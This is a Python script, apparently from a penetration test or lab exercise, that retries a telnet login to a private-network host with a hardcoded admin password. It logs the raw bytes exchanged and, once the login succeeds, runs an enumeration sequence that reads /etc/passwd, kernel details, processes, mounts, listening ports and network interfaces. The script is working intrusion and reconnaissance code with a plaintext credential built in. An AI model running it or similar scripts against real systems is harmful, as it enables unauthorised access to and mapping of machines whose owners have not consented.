"""
Careful retry of admin:W3st.U3er.W3st with explicit byte-level logging
to rule out encoding or timing issues.
"""
import telnetlib
import sys
import time

HOST = "10.172.139.14"
PORT = 23
USERNAME = b"admin"
PASSWORD = b"W3st.U3er.W3st"

print(f"Attempting: {USERNAME.decode()} / {PASSWORD.decode()}", flush=True)
print(f"Username bytes: {USERNAME!r} (len={len(USERNAME)})", flush=True)
print(f"Password bytes: {PASSWORD!r} (len={len(PASSWORD)})", flush=True)
print()

try:
    tn = telnetlib.Telnet(HOST, PORT, timeout=10)

    # Read until login prompt
    banner = tn.read_until(b"login:", timeout=8)
    print(f"BANNER ({len(banner)} bytes): {banner!r}", flush=True)

    # Send username with \r\n (proper telnet line ending)
    tn.write(USERNAME + b"\r\n")
    time.sleep(1)

    pw_prompt = tn.read_until(b"assword:", timeout=8)
    print(f"PW PROMPT ({len(pw_prompt)} bytes): {pw_prompt!r}", flush=True)

    # Send password with \r\n
    tn.write(PASSWORD + b"\r\n")
    print("Password sent.", flush=True)

    # Wait generously
    time.sleep(5)
    response = tn.read_very_eager()
    print(f"\nRESPONSE ({len(response)} bytes): {response!r}", flush=True)
    print(f"\nDECODED:\n{response.decode(errors='replace')}", flush=True)

    # Try issuing a probe command regardless
    tn.write(b"echo __ALIVE__\r\n")
    time.sleep(2)
    probe = tn.read_very_eager()
    print(f"\nAFTER 'echo __ALIVE__' ({len(probe)} bytes): {probe!r}", flush=True)

    if b"__ALIVE__" in probe:
        print("\n✓ AUTHENTICATED — running enumeration", flush=True)
        commands = [
            b"id",
            b"uname -a",
            b"cat /proc/version",
            b"ls -la /",
            b"cat /etc/passwd",
            b"cat /proc/cmdline",
            b"ps 2>/dev/null | head -30",
            b"mount",
            b"netstat -tnl 2>/dev/null",
            b"ifconfig 2>/dev/null || ip a",
        ]
        for cmd in commands:
            tn.write(cmd + b"\r\n")
            time.sleep(1.5)
            out = tn.read_very_eager().decode(errors='replace')
            print(f"\n>>> {cmd.decode()}\n{out}", flush=True)
        tn.write(b"exit\r\n")
    else:
        print("\n✗ NOT AUTHENTICATED", flush=True)

    tn.close()

except Exception as e:
    print(f"ERROR: {e}", flush=True)
    sys.exit(1)
